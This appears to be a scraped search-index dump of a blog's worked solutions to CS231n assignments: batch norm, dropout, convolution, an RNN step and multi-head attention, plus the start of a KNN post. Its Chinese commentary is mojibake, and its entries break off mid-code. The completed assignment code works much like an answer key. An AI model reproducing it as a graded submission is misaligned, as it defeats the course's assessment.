Dictionary with the following keys: - mode: 'train' or 'test'; required - eps: Constant for numeric stability - momentum: Constant for running mean / variance. - running_mean: Array of shape (D,) giving running mean of features - running_var Array of shape (D,) giving running variance of features Returns a tuple of: - out: of shape (N, D) - cache: A tuple of values needed in the backward pass \"\"\" mode = bn_param[\"mode\"] eps = bn_param.get(\"eps\", 1e-5) momentum = bn_param.get(\"momentum\", 0.9) N, D = x.shape running_mean = bn_param.get(\"running_mean\", np.zeros(D, dtype=x.dtype)) running_var = bn_param.get(\"running_var\", np.zeros(D, dtype=x.dtype)) out, cache = None, None if mode == \"train\": ####################################################################### # TODO: Implement the training-time forward pass for batch norm. # # Use minibatch statistics to compute the mean and variance, use # # these statistics to normalize the incoming data, and scale and # # shift the normalized data using gamma and beta. # # # # You should store the output in the variable out. Any intermediates # # that you need for the backward pass should be stored in the cache # # variable. # # # # You should also use your computed sample mean and variance together # # with the momentum variable to update the running mean and running # # variance, storing your result in the running_mean and running_var # # variables. # # # # Note that though you should be keeping track of the running # # variance, you should normalize the data based on the standard # # deviation (square root of variance) instead! # # Referencing the original paper (https://arxiv.org/abs/1502.03167) # # might prove to be helpful. # ####################################################################### # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** mean, var = np.mean(x, axis=0), np.var(x, axis=0) x_norm = (x - mean) / np.sqrt(var + eps) out = gamma * x_norm + beta running_mean = momentum * running_mean + (1 - momentum) * mean running_var = momentum * running_var + (1 - momentum) * var cache = (x, x_norm, mean, var, gamma, beta, eps) # *****END OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** ####################################################################### # END OF YOUR CODE # ####################################################################### elif mode == \"test\": ####################################################################### # TODO: Implement the test-time forward pass for batch normalization. # # Use the running mean and variance to normalize the incoming data, # # then scale and shift the normalized data using gamma and beta. # # Store the result in the out variable. # ################################","date":"2024-12-03","objectID":"/posts/mlcs231n/:3:2","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Q3: Dropout å‚è€ƒè®ºæ–‡ ç®€å•æ¥è¯´å°±æ˜¯å‰å‘ä¼ æ’­çš„æ—¶å€™ä¼šéšæœºæŠŠä¸€äº›ç¥ç»å…ƒçš„å€¼å˜ä¸º 0ï¼Œå¯ä»¥ç¼“è§£è¿‡æ‹Ÿåˆã€‚ TODO: dropout_forward å‚è€ƒå®˜ç½‘è®²ä¹‰ï¼šå®˜ç½‘è®²ä¹‰ ç”Ÿæˆä¸€ä¸ª 0/1 æ¦‚ç‡å‘é‡ï¼Œå…¶ä¸­æ¦‚ç‡ä¸º $p$ï¼Œå¦‚æœæ¦‚ç‡å°äº $p$ åˆ™ä¸ä¼šè¢«ç½®ä¸º $0$ï¼Œä¸ºäº†æœ€åè¾“å‡ºæœŸæœ›ç»Ÿä¸€è¦ä¹˜ä¸Š $\\dfrac{1}{p}$ æ”¾ç¼©ã€‚ def dropout_forward(x, dropout_param): \"\"\" Performs the forward pass for (inverted) dropout. Inputs: - x: Input data, of any shape - dropout_param: A dictionary with the following keys: - p: Dropout parameter. We keep each neuron output with probability p. - mode: 'test' or 'train'. If the mode is train, then perform dropout; if the mode is test, then just return the input. - seed: Seed for the random number generator. Passing seed makes this function deterministic, which is needed for gradient checking but not in real networks. Outputs: - out: Array of the same shape as x. - cache: tuple (dropout_param, mask). In training mode, mask is the dropout mask that was used to multiply the input; in test mode, mask is None. NOTE: Please implement **inverted** dropout, not the vanilla version of dropout. See http://cs231n.github.io/neural-networks-2/#reg for more details. NOTE 2: Keep in mind that p is the probability of **keep** a neuron output; this might be contrary to some sources, where it is referred to as the probability of dropping a neuron output. \"\"\" p, mode = dropout_param[\"p\"], dropout_param[\"mode\"] if \"seed\" in dropout_param: np.random.seed(dropout_param[\"seed\"]) mask = None out = None if mode == \"train\": ####################################################################### # TODO: Implement training phase forward pass for inverted dropout. # # Store the dropout mask in the mask variable. # ####################################################################### # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** mask = (np.random.rand(*x.shape) \u003c p) / p out = x * mask # *****END OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** ####################################################################### # END OF YOUR CODE # ####################################################################### elif mode == \"test\": ####################################################################### # TODO: Implement the test phase forward pass for inverted dropout. # ####################################################################### # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** out = x # *****END OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** ####################################################################### # END OF YOUR CODE # ####################################################################### cache = (dropout_param, mask) out = out.astype(x.dtype, copy=False) return out, cache Running tests with p = 0.25 Mean of input: 10.000207878477502 Mean of train-time output: 10.014059116977283 Mean of test-time output: 10.000207878477502 Fraction of train-time output set to zero: 0.749784 Fraction of test-time output set to zero: 0.0 Running tests with p = 0.4 Mean of input: 10.000207878477502 Mean of train-time output: 9.977917658761159 Mean of test-time output: 10.000207878477502 Fraction of train-time output set to zero: 0.600796 Fraction of test-time output set to zero: 0.0 Running tests with p = 0.7 Mean of input: 10.000207878477502 Mean of train-time output: 9.987811912159426 Mean of test-time output: 10.000207878477502 Fraction of train-time output set to zero: 0.30074 Fraction of test-time output set to zero: 0.0 TODO: dropout_backward def dropout_backward(dout, cache): \"\"\" Perform the backward pass for (inverted) dropout. Inputs: - dout: Upstream derivatives, of any shape - cache: (dropout_param, mask) from dropout_forward. \"\"\" dropout_param, mask = cache mode = dropout_param[\"mode\"] dx = None if mode == \"train\": ####################################################################### # TODO: Implement training phase backward pass for inverted dropout # ####################################################################### # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** dx = dout * mask # *****END OF YOUR CO","date":"2024-12-03","objectID":"/posts/mlcs231n/:3:3","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Q4: Convolutional Neural Networks TODO: conv_forward_naive def conv_forward_naive(x, w, b, conv_param): \"\"\" A naive implementation of the forward pass for a convolutional layer. The input consists of N data points, each with C channels, height H and width W. We convolve each input with F different filters, where each filter spans all C channels and has height HH and width WW. Input: - x: Input data of shape (N, C, H, W) - w: Filter weights of shape (F, C, HH, WW) - b: Biases, of shape (F,) - conv_param: A dictionary with the following keys: - 'stride': The number of pixels between adjacent receptive fields in the horizontal and vertical directions. - 'pad': The number of pixels that will be used to zero-pad the input. During padding, 'pad' zeros should be placed symmetrically (i.e equally on both sides) along the height and width axes of the input. Be careful not to modfiy the original input x directly. Returns a tuple of: - out: Output data, of shape (N, F, H', W') where H' and W' are given by H' = 1 + (H + 2 * pad - HH) / stride W' = 1 + (W + 2 * pad - WW) / stride - cache: (x, w, b, conv_param) \"\"\" out = None ########################################################################### # TODO: Implement the convolutional forward pass. # # Hint: you can use the function np.pad for padding. # ########################################################################### # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** # å…ˆè·å–ä¸€äº›éœ€è¦ç”¨åˆ°çš„æ•°æ® N, C, H_input, W_input = x.shape # Nä¸ªæ ·æœ¬ï¼ŒCä¸ªé€šé“ï¼ŒH_inputé«˜ï¼ŒW_inputå®½ F, C_w_, HH, WW = w.shape # Fä¸ªå·ç§¯æ ¸, C_w_ä¸ªé€šé“ï¼ŒHHé«˜ï¼ŒWWå®½ stride = conv_param[\"stride\"] # æ­¥é•¿ pad = conv_param[\"pad\"] # å¡«å……æ•°é‡ # è®¡ç®—å·ç§¯åçš„é«˜å’Œå®½ out_H = int(1 + (H_input + 2 * pad - HH) / stride) out_W = int(1 + (W_input + 2 * pad - WW) / stride) # ç»™xçš„ä¸Šä¸‹å·¦å³å¡«å……ä¸Špadä¸ª0 x_pad = np.pad(x, ((0, 0), (0, 0), (pad, pad), (pad, pad)), \"constant\", constant_values=0) # å°†å·ç§¯æ ¸wè½¬æ¢æˆF * (C * HH * WW)çš„çŸ©é˜µ (ä¾¿äºä½¿ç”¨çŸ©é˜µä¹˜æ³•) w_row = w.reshape(F, -1) # ç”Ÿæˆç©ºç™½è¾“å‡ºä¾¿äºåç»­å¾ªç¯å¡«å…… out = np.zeros((N, F, out_H, out_W)) # å¼€å§‹å·ç§¯ for n in range(N): # éå†æ ·æœ¬ for f in range(F): # éå†å·ç§¯æ ¸ for i in range(out_H): # éå†é«˜ for j in range(out_W): # éå†å®½ # è·å–å½“å‰å·ç§¯çª—å£ window = x_pad[n, :, i * stride:i * stride + HH, j * stride:j * stride + WW] # å°†å·ç§¯çª—å£æ‹‰æˆä¸€è¡Œ window_row = window.reshape(1, -1) # è®¡ç®—å½“å‰å·ç§¯çª—å£å’Œå·ç§¯æ ¸çš„å·ç§¯ç»“æœ out[n, f, i, j] = np.sum(window_row * w_row[f, :]) + b[f] # å°†padåçš„xå­˜å…¥cache (çœçš„åå‘ä¼ æ’­çš„æ—¶å€™åœ¨è®¡ç®—ä¸€æ¬¡) x = x_pad # *****END OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** ########################################################################### # END OF YOUR CODE # ########################################################################### cache = (x, w, b, conv_param) return out, cache Testing conv_forward_naive difference: 2.2121476417505994e-08 TODO: conv_backward_naive def conv_backward_naive(dout, cache): \"\"\" A naive implementation of the backward pass for a convolutional layer. Inputs: - dout: Upstream derivatives. - cache: A tuple of (x, w, b, conv_param) as in conv_forward_naive Returns a tuple of: - dx: Gradient with respect to x - dw: Gradient with respect to w - db: Gradient with respect to b \"\"\" dx, dw, db = None, None, None ########################################################################### # TODO: Implement the convolutional backward pass. # ########################################################################### # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** # è·å–ä¸€äº›éœ€è¦ç”¨åˆ°çš„æ•°æ® x, w, b, conv_param = cache N, C, H_input, W_input = x.shape # Nä¸ªæ ·æœ¬ï¼ŒCä¸ªé€šé“ï¼ŒH_inputé«˜ï¼ŒW_inputå®½ F, C_w_, HH, WW = w.shape # Fä¸ªå·ç§¯æ ¸, C_w_ä¸ªé€šé“ï¼ŒHHé«˜ï¼ŒWWå®½ stride = conv_param[\"stride\"] # æ­¥é•¿ pad = conv_param[\"pad\"] # å¡«å……æ•°é‡ # è®¡ç®—å·ç§¯åçš„é«˜å’Œå®½ out_H = int(1 + (H_input - HH) / stride) out_W = int(1 + (W_input - WW) / stride) # ç»™dx,dw,dbåˆ†é…ç©ºé—´ dx = np.zeros_like(x) dw = np.zeros_like(w) db = np.zeros_like(b) for n in range(N): for f in range(F): for i in range(out_H): for j in range(out_W): # è·å–å½“å‰å·ç§¯çª—å£ window = x[n, :, i * stride:i * stride + HH, j * stride:j * stride + WW] # è®¡ç®—db db[f] += dout[n, f, i, j] # è®¡ç®—dw dw[f] += window ","date":"2024-12-03","objectID":"/posts/mlcs231n/:3:4","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Q5: PyTorch on CIFAR-10 ä½¿ç”¨ PyTorch æ¥å®ç°ä¸€äº›ç¥ç»ç½‘ç»œã€‚ Barebones PyTorch: Two-Layer Network å®ç°ä¸€ä¸ªä¸¤å±‚ ReLU çš„å…¨è¿æ¥ç¥ç»ç½‘ç»œï¼Œä¸»è¦æ˜¯å¯¹ PyTorch çš„åŸºæœ¬è¯­æ³•ç†Ÿæ‚‰ä¸€ä¸‹ã€‚ import torch.nn.functional as F # useful stateless functions def two_layer_fc(x, params): \"\"\" A fully-connected neural networks; the architecture is: NN is fully connected -\u003e ReLU -\u003e fully connected layer. Note that this function only defines the forward pass; PyTorch will take care of the backward pass for us. The input to the network will be a minibatch of data, of shape (N, d1, ..., dM) where d1 * ... * dM = D. The hidden layer will have H units, and the output layer will produce scores for C classes. Inputs: - x: A PyTorch Tensor of shape (N, d1, ..., dM) giving a minibatch of input data. - params: A list [w1, w2] of PyTorch Tensors giving weights for the network; w1 has shape (D, H) and w2 has shape (H, C). Returns: - scores: A PyTorch Tensor of shape (N, C) giving classification scores for the input data x. \"\"\" # first we flatten the image x = flatten(x) # shape: [batch_size, C x H x W] w1, w2 = params # Forward pass: compute predicted y using operations on Tensors. Since w1 and # w2 have requires_grad=True, operations involving these Tensors will cause # PyTorch to build a computational graph, allowing automatic computation of # gradients. Since we are no longer implementing the backward pass by hand we # don't need to keep references to intermediate values. # you can also use `.clamp(min=0)`, equivalent to F.relu() x = F.relu(x.mm(w1)) x = x.mm(w2) return x def two_layer_fc_test(): hidden_layer_size = 42 x = torch.zeros((64, 50), dtype=dtype) # minibatch size 64, feature dimension 50 w1 = torch.zeros((50, hidden_layer_size), dtype=dtype) w2 = torch.zeros((hidden_layer_size, 10), dtype=dtype) scores = two_layer_fc(x, [w1, w2]) print(scores.size()) # you should see [64, 10] two_layer_fc_test() torch.nn.functional æ˜¯å®šä¹‰äº†ä¸€ä¸ªæ— çŠ¶æ€å‡½æ•°ï¼Œä»–æä¾›äº†ä¸€ç³»åˆ—çš„å¸¸ç”¨å‡½æ•°ã€‚ torch.zeros æ˜¯ PyTorch ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªå…¨ä¸ºé›¶çš„å¼ é‡ã€‚ flatten æ˜¯å°†è¾“å…¥çš„å›¾åƒæ•°æ®æ‰å¹³åŒ–ä¸ºä¸€ç»´å‘é‡ï¼Œä»¥ä¾¿äºåç»­çš„å…¨è¿æ¥å±‚å¤„ç†ã€‚ mm() çŸ©é˜µä¹˜æ³•ã€‚ TODO: Barebones PyTorch: Three-Layer ConvNet å®Œæˆå‡½æ•° three_layer_convnet çš„å®ç°ï¼Œè¯¥å‡½æ•°å°†æ‰§è¡Œä¸‰å±‚å·ç§¯ç½‘ç»œçš„å‰å‘ä¼ æ’­ã€‚ç½‘ç»œåº”å…·æœ‰ä»¥ä¸‹æ¶æ„ï¼š ä¸€ä¸ªå·ç§¯å±‚ï¼ˆå¸¦åç½®ï¼‰ï¼Œå…·æœ‰ channel_1 ä¸ªæ»¤æ³¢å™¨ï¼Œæ¯ä¸ªæ»¤æ³¢å™¨çš„å½¢çŠ¶ä¸º KW1 x KH1ï¼Œå¹¶ä¸”æœ‰é›¶å¡«å……ä¸º2ã€‚ ReLU éçº¿æ€§æ¿€æ´»ã€‚ ä¸€ä¸ªå·ç§¯å±‚ï¼ˆå¸¦åç½®ï¼‰ï¼Œå…·æœ‰ channel_2 ä¸ªæ»¤æ³¢å™¨ï¼Œæ¯ä¸ªæ»¤æ³¢å™¨çš„å½¢çŠ¶ä¸º KW2 x KH2ï¼Œå¹¶ä¸”æœ‰é›¶å¡«å……ä¸º1ã€‚ ReLU éçº¿æ€§æ¿€æ´»ã€‚ ä¸€ä¸ªå…¨è¿æ¥å±‚ï¼ˆå¸¦åç½®ï¼‰ï¼Œç”Ÿæˆ C ç±»çš„åˆ†æ•°ã€‚ def three_layer_convnet(x, params): \"\"\" Performs the forward pass of a three-layer convolutional network with the architecture defined above. Inputs: - x: A PyTorch Tensor of shape (N, 3, H, W) giving a minibatch of images - params: A list of PyTorch Tensors giving the weights and biases for the network; should contain the following: - conv_w1: PyTorch Tensor of shape (channel_1, 3, KH1, KW1) giving weights for the first convolutional layer - conv_b1: PyTorch Tensor of shape (channel_1,) giving biases for the first convolutional layer - conv_w2: PyTorch Tensor of shape (channel_2, channel_1, KH2, KW2) giving weights for the second convolutional layer - conv_b2: PyTorch Tensor of shape (channel_2,) giving biases for the second convolutional layer - fc_w: PyTorch Tensor giving weights for the fully-connected layer. Can you figure out what the shape should be? - fc_b: PyTorch Tensor giving biases for the fully-connected layer. Can you figure out what the shape should be? Returns: - scores: PyTorch Tensor of shape (N, C) giving classification scores for x \"\"\" conv_w1, conv_b1, conv_w2, conv_b2, fc_w, fc_b = params scores = None ################################################################################ # TODO: Implement the forward pass for the three-layer ConvNet. # ################################################################################ # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** # ç¬¬ä¸€å±‚å·ç§¯ x = F.conv2d(x, conv_w1, conv_b1, padding=2) # ä½¿ç”¨é›¶å¡«å…… x = F.relu(x) # ReLU æ¿€æ´» # ç¬¬äºŒå±‚å·ç§¯ x = F.conv2d(x, conv_w2, conv_b2, padding=1) # ä½¿ç”¨é›¶å¡«å…… x = F.relu(x) # ReLU æ¿€æ´» # å±•å¹³ x = flatten(x) # å…¨è¿æ¥å±‚ scores = x.mm(fc_w) + fc_b # è®¡ç®—åˆ†æ•° # *****END OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** ########","date":"2024-12-03","objectID":"/posts/mlcs231n/:3:5","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Assignment 3 ","date":"2024-12-03","objectID":"/posts/mlcs231n/:4:0","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Q1: Image Captioning with Vanilla RNNs RNN ç»“æ„æ¨¡å‹å›¾å¦‚ä¸‹ï¼š ç‰¹ç‚¹å°±æ˜¯å¯ä»¥ä¿ç•™å†å²ä¿¡æ¯ï¼Œå…¶ä¸­ $x$ å¯ä»¥ä»£è¡¨ä¸€ä¸ªå•è¯å‘é‡ï¼Œ$x_t$ æ˜¯ç¬¬ $t$ ä¸ªå•è¯å‘é‡ (ä¹Ÿå«åš $t$ æ—¶åˆ»)ï¼Œå›¾ä¸­çš„ $W, U, V$ æ˜¯æ¯ä¸ªæ—¶åˆ»å…±ç”¨çš„å‚æ•°ã€‚ æ¨¡å‹å…¬å¼ï¼š $$ o_t = g(V \\cdot s_t) \\\\ s_t = f(U \\cdot x_t + W \\cdot s_{t - 1}) $$ åœ¨ CS231n ä¸­ï¼ŒåŸºæœ¬æ¨¡å‹å¦‚ä¸‹ï¼š å…ˆä»å•æ­¥æ¨¡å‹çœ‹èµ·ï¼š TODO: rnn_step_forward å•æ­¥çš„å‰å‘ä¼ æ’­ç›´æ¥å¥—ç”¨å…¬å¼ï¼Œè¿™é‡Œæ¿€æ´»å‡½æ•°ä¸€èˆ¬æ˜¯ $\\tanh$ $$ \\text{next}_h = \\tanh(\\text{prev}_h \\cdot W_h + x \\cdot W_x + b) $$ def rnn_step_forward(x, prev_h, Wx, Wh, b): \"\"\"Run the forward pass for a single timestep of a vanilla RNN using a tanh activation function. The input data has dimension D, the hidden state has dimension H, and the minibatch is of size N. Inputs: - x: Input data for this timestep, of shape (N, D) - prev_h: Hidden state from previous timestep, of shape (N, H) - Wx: Weight matrix for input-to-hidden connections, of shape (D, H) - Wh: Weight matrix for hidden-to-hidden connections, of shape (H, H) - b: Biases of shape (H,) Returns a tuple of: - next_h: Next hidden state, of shape (N, H) - cache: Tuple of values needed for the backward pass. \"\"\" next_h, cache = None, None ############################################################################## # TODO: Implement a single forward step for the vanilla RNN. Store the next # # hidden state and any values you need for the backward pass in the next_h # # and cache variables respectively. # ############################################################################## # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** next_h = np.tanh(np.dot(prev_h, Wh) + np.dot(x, Wx) + b) cache = (x, prev_h, Wx, Wh, b, next_h) # *****END OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** ############################################################################## # END OF YOUR CODE # ############################################################################## return next_h, cache TODO: rnn_step_backward åå‘ä¼ æ’­æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹ $\\mathrm{d}x$ æ ¹æ®å…¬å¼ $\\text{next}_h = \\tanh(\\text{prev}_h \\cdot W_h + x \\cdot W_x + b)$ æˆ‘ä»¬å…ˆè®¾ $z = \\text{prev}_h \\cdot W_h + x \\cdot W_x + b$ ä¹Ÿå°±æ˜¯ $\\text{next}_h = \\tanh(z)$ é‚£ä¹ˆ $x$ çš„æ¢¯åº¦å°±æ˜¯ $$ \\frac{\\partial L}{\\partial x} = \\frac{\\partial L}{ \\partial z} \\cdot \\frac{\\partial z}{ \\partial x} = \\frac{\\partial L}{ \\partial z} \\cdot W_x ^ {\\top} $$ é‚£æ¥çœ‹ä¸€ä¸‹ $\\dfrac{\\partial L}{\\partial z}$ è¿™æ˜¯ä»€ä¹ˆï¼š $$ \\frac{\\partial L}{\\partial z} = \\frac{\\partial L}{\\partial \\text{next}_h} \\cdot \\frac{\\partial \\text{next}_h}{\\partial z} = \\mathrm{d} \\text{next}_h \\cdot \\frac{\\partial \\text{next}_h}{\\partial z} $$ é‚£ä¹ˆ $\\dfrac{\\partial \\text{next}_h}{\\partial z}$ å°±æ˜¯å¯¹ $\\tanh(z)$ æ±‚å¯¼ï¼Œå¯¼æ•°ä¸º $1 - \\tanh^2(z)$ æ‰€ä»¥ $\\dfrac{\\partial L}{\\partial z} = \\mathrm{d} \\text{next}_h (1 - \\tanh^2(z))$ï¼ŒæŠŠè¿™ä¸ªè®°ä¸º $\\mathrm{d}\\tanh$ æ‰€ä»¥ $\\mathrm{d}x = \\mathrm{d}\\tanh \\cdot W_x ^ {\\top}$ å…¶ä»–å‚æ•°éƒ½æ˜¯åŒç†çš„ã€‚ def rnn_step_backward(dnext_h, cache): \"\"\"Backward pass for a single timestep of a vanilla RNN. Inputs: - dnext_h: Gradient of loss with respect to next hidden state, of shape (N, H) - cache: Cache object from the forward pass Returns a tuple of: - dx: Gradients of input data, of shape (N, D) - dprev_h: Gradients of previous hidden state, of shape (N, H) - dWx: Gradients of input-to-hidden weights, of shape (D, H) - dWh: Gradients of hidden-to-hidden weights, of shape (H, H) - db: Gradients of bias vector, of shape (H,) \"\"\" dx, dprev_h, dWx, dWh, db = None, None, None, None, None ############################################################################## # TODO: Implement the backward pass for a single step of a vanilla RNN. # # # # HINT: For the tanh function, you can compute the local derivative in terms # # of the output value from tanh. # ############################################################################## # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** x, prev_h, Wx, Wh, b, next_h = cache dtanh = dnext_h * (1 - next_h**2) dx = np.dot(dtanh, Wx.T) dprev_h = np.dot(dtanh, Wh.T) dWx = np.dot(x.T, dtanh) dWh = np.dot(prev_h.T, dtanh) db = np.sum(dtanh, 0) # *****END OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** ##############################","date":"2024-12-03","objectID":"/posts/mlcs231n/:4:1","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Q2: Image Captioning with Transformers TODO: MultiHeadAttention è¾“å…¥æ ¼å¼ï¼š $N$ è¡¨ç¤º batch sizeï¼Œ$S$ è¡¨ç¤ºæºåºåˆ—é•¿åº¦ï¼Œ$T$ è¡¨ç¤ºç›®æ ‡åºåˆ—é•¿åº¦ï¼Œ$E$ è¡¨ç¤º embedding ç»´åº¦ã€‚ queryï¼šä½œä¸ºæŸ¥è¯¢ï¼ˆqueryï¼‰ä½¿ç”¨çš„è¾“å…¥æ•°æ®ï¼Œå½¢çŠ¶ä¸º (N, S, E) keyï¼šä½œä¸ºé”®ï¼ˆkeyï¼‰ä½¿ç”¨çš„è¾“å…¥æ•°æ®ï¼Œå½¢çŠ¶ä¸º (N, T, E) valueï¼šä½œä¸ºå€¼ï¼ˆvalueï¼‰ä½¿ç”¨çš„è¾“å…¥æ•°æ®ï¼Œå½¢çŠ¶ä¸º (N, T, E) attn_maskï¼šå½¢çŠ¶ä¸º $(S, T)$ çš„æ•°ç»„ï¼Œå…¶ä¸­ $\\text{mask}_{i, j} = 0$ è¡¨ç¤ºæºåºåˆ—ä¸­çš„ç¬¬ $i$ ä¸ª token ä¸åº”å½±å“ç›®æ ‡åºåˆ—ä¸­çš„ç¬¬ $j$ ä¸ª token è¿”å›ï¼š outputï¼šå½¢çŠ¶ä¸º $(N, S, E)$ çš„å¼ é‡ï¼Œæ ¹æ®ç”¨ key å’Œ query è®¡ç®—å¾—åˆ°çš„æ³¨æ„åŠ›æƒé‡ï¼Œå¯¹ value ä¸­çš„æ•°æ®åŠ æƒç»„åˆåçš„ç»“æœã€‚ class MultiHeadAttention(nn.Module): \"\"\" A model layer which implements a simplified version of masked attention, as introduced by \"Attention Is All You Need\" (https://arxiv.org/abs/1706.03762). Usage: attn = MultiHeadAttention(embed_dim, num_heads=2) # self-attention data = torch.randn(batch_size, sequence_length, embed_dim) self_attn_output = attn(query=data, key=data, value=data) # attention using two inputs other_data = torch.randn(batch_size, sequence_length, embed_dim) attn_output = attn(query=data, key=other_data, value=other_data) \"\"\" def __init__(self, embed_dim, num_heads, dropout=0.1): \"\"\" Construct a new MultiHeadAttention layer. Inputs: - embed_dim: Dimension of the token embedding - num_heads: Number of attention heads - dropout: Dropout probability \"\"\" super().__init__() assert embed_dim % num_heads == 0 # We will initialize these layers for you, since swapping the ordering # would affect the random number generation (and therefore your exact # outputs relative to the autograder). Note that the layers use a bias # term, but this isn't strictly necessary (and varies by # implementation). self.key = nn.Linear(embed_dim, embed_dim) self.query = nn.Linear(embed_dim, embed_dim) self.value = nn.Linear(embed_dim, embed_dim) self.proj = nn.Linear(embed_dim, embed_dim) self.attn_drop = nn.Dropout(dropout) self.n_head = num_heads self.emd_dim = embed_dim self.head_dim = self.emd_dim // self.n_head def forward(self, query, key, value, attn_mask=None): \"\"\" Calculate the masked attention output for the provided data, computing all attention heads in parallel. In the shape definitions below, N is the batch size, S is the source sequence length, T is the target sequence length, and E is the embedding dimension. Inputs: - query: Input data to be used as the query, of shape (N, S, E) - key: Input data to be used as the key, of shape (N, T, E) - value: Input data to be used as the value, of shape (N, T, E) - attn_mask: Array of shape (S, T) where mask[i,j] == 0 indicates token i in the source should not influence token j in the target. Returns: - output: Tensor of shape (N, S, E) giving the weighted combination of data in value according to the attention weights calculated using key and query. \"\"\" N, S, E = query.shape N, T, E = value.shape # Create a placeholder, to be overwritten by your code below. output = torch.empty((N, S, E)) ############################################################################ # TODO: Implement multiheaded attention using the equations given in # # Transformer_Captioning.ipynb. # # A few hints: # # 1) You'll want to split your shape from (N, T, E) into (N, T, H, E/H), # # where H is the number of heads. # # 2) The function torch.matmul allows you to do a batched matrix multiply.# # For example, you can do (N, H, T, E/H) by (N, H, E/H, T) to yield a # # shape (N, H, T, T). For more examples, see # # https://pytorch.org/docs/stable/generated/torch.matmul.html # # 3) For applying attn_mask, think how the scores should be modified to # # prevent a value from influencing output. Specifically, the PyTorch # # function masked_fill may come in handy. # ############################################################################ # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** # 1. çº¿æ€§å˜æ¢ï¼Œå¾—åˆ° Q, K, V # å½¢çŠ¶ï¼š(N, S, E) / (N, T, E) -\u003e (N, S, E) / (N, T, E) Q = self.query(query) # (N, S, E) K = self.key(key) # (N, T, E) V = self.value(value) # (N, T, E) # 2. æ‹†åˆ†å¤šå¤´ (N, S, E) -\u003e (N, n_head, S, head_dim) def split_heads(x): N, L, E = x.shape return x.view(N, L, self.n_head, self.head_dim)","date":"2024-12-03","objectID":"/posts/mlcs231n/:4:2","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"å‚è€ƒ https://github.com/Divsigma/2020-cs213n/tree/master/cs231n https://github.com/Na-moe/CS231n-2024/tree/main https://github.com/Chia202/CS231n/tree/main https://blog.csdn.net/leezed525/category_12388436.html ","date":"2024-12-03","objectID":"/posts/mlcs231n/:5:0","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æ¦‚è¿° ç®€å•æ¥è®²ï¼Œå°±æ˜¯ç»™å®šä¸€ä¸ªè®­ç»ƒé›†ï¼Œç„¶åæ‹¿åˆ°ä¸€ä¸ªæ–°çš„è¾“å…¥æ•°æ®ï¼Œåœ¨è®­ç»ƒé›†ä¸­æ‰¾åˆ°ä¸è¯¥è¾“å…¥çš„ $k$ ä¸ªæ•°æ®ï¼Œè¿™ $k$ ä¸ªæ•°æ®æ•°é‡å¤šçš„æŸä¸ªç±»ï¼Œå°±æ˜¯è¯¥æ–°æ•°æ®çš„ç±»åˆ«ã€‚è¿™ä¸ªç®—æ³•ç§°ä¸º $k$ è¿‘é‚» ($\\text{K-Nearest Neighbors}$) ","date":"2024-11-28","objectID":"/posts/mlknn/:1:0","tags":["KNN","KDTree"],"title":"KNN","uri":"/posts/mlknn/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æ¨¡å‹ ","date":"2024-11-28","objectID":"/posts/mlknn/:2:0","tags":["KNN","KDTree"],"title":"KNN","uri":"/posts/mlknn/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"è·ç¦» è¾“å…¥å’Œè®­ç»ƒé›†çš„è·ç¦»è¯¥å¦‚ä½•åº¦é‡ï¼Œä¸€èˆ¬æ¥è¯´æœ‰ä»¥ä¸‹å‡ ç§åº¦é‡æ–¹å¼ï¼š å‡è®¾æ•°æ®é›†ç‰¹å¾å‘é‡ $x_i \\in \\textbf{R}^n$ï¼Œ$x_i = \\left(x_i^{(1)}, x_i^{(2)},\\cdots,x_i^{(n)}\\right) ^ \\top$ é—µå¯å¤«æ–¯åŸº (Minkowski) è·ç¦» $$ L_p(x_i,x_j) = \\left( \\sum_{l = 1} ^ {n} |x_i^{(l)} - x_j^{(l)}|^p \\right) ^ {\\frac{1}{p}} $$ æ¬§æ°è·ç¦» å…¶å®å°±æ˜¯é—µå¯å¤«æ–¯åŸºè·ç¦»çš„ $p = 2$ $$ 